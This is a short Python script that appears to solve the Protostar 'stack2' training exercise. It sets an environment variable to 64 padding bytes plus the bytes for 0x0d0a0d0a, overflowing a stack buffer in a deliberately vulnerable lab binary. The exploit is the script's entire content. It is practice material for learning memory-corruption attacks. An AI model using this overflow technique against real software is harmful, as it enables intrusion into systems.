#!/usr/bin/python
# Goal is 0x0d0a0d0a

import commands
import os

# Create string with desired environment variable
greenie = 'A'*64 + '\x0a\x0d\x0a\x0d'

# Set environment variable
os.environ["GREENIE"] = greenie

# Print out environment variable, with quotes to show non-printable chars
#print '"' + os.environ["GREENIE"] + '"'

# Path to binary
command = '/opt/protostar/bin/stack2'

# Run command and print output
output = commands.getoutput(command)
print(output)
